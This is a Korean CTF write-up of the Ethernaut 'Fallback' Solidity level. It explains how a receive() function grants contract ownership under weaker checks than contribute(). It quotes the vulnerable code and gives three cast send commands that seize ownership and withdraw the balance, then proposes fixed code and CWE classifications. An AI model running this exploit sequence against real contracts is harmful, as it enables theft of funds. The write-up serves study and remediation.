# [Ethernaut] 01-fallback

## 취약점 요약
- 이번 문제의 취약점은 owner 권한 변경이라는 동일한 기능을 contribute()와 receive() 각각 두 함수에 중복 구현되어 있음과 동시에 검증 수준을 상이하게 만든 것입니다. 이와 같은 취약점으로 인해 검증이 느슨한 receive() 함수를 호출해서 owner 권한을 얻음과 동시에 컨트랙트 잔액을 모두 탈취할 수 있게 됩니다!

## 사전 지식
1. **receive()** : 해당 함수는 트랜잭션을 보낼 때 calldata의 값이 비어 있는 경우 자동으로 호출 됩니다.
2. **fallback()** : 해당 함수는 트랜잭션을 보낼 떄 calldata에 값이 들어있지만 컨트랙트애 있는 어떠한 함수랑도 매칭되지 않으면 자동으로 호출 됩니다. 또한 calldata의 값이 비어있고 컨트랙트에 receive() 함수가 없는 경우에도 fallback() 함수가 호출 됩니다.

## 취약 코드
```solidity
    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }
```
```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```

## 원인 분석
1. owner 권한을 얻을 수 있는 두 함수의 검증 로직이 다르다!
컨트랙트에서 권한 변경하는 함수는 한 개 이상이 될 수 있습니다. 하지만 함수에 접근 할 수 있는 검증 로직이 다르다면, 보다 허술한 검증을 하는 함수를 호출해서 쉽게 권한 변경을 할 수 있게됩니다.

해당 문제에서 contribute()와 receive() 함수에서 owner 권한으로 변경 할 수 있는데, contribute에서는 if문을 통과한 뒤 "owner = msg.sender"까지 닿기 힘들어보입니다. 하지만 receive() 함수를 보면 owner로 권한 변경이라는 똑같은 기능을 수행하는데 검증 기준이 contribute()랑 다르고 심지어 간단하게 되어 있습니다. 따라서 receive 함수를 트리거 시킨다면 충분히 owner 권한을 탈취할 수 있게 됩니다.

## 익스플로잇 로직
```bash
cast send <인스턴스 주소> "contribute()" --value 0.0001ether --rpc-url <RPC_URL> --account <지갑 계정>
cast send <인스턴스 주소> --value 0.0001ether --rpc-url <RPC_URL> --account <지갑 계정>
cast send <인스턴스 주소> "withdraw()" --rpc-url <RPC_URL> --account <지갑 계정>
```

## 수정 방안
```solidity
    // receive()에서 소유권 변경 로직 제거
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    contributions[msg.sender] += msg.value;
}
```
```solidity
    // contribute()와 동일한 검증을 적용
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    if (contributions[msg.sender] > contributions[owner]) {
        owner = msg.sender;
    }
}
```

## CWE 분류
- CWE-284(Improper Access Control)
- CWE-841(Improper Enforcement of Behavioral Workflow)

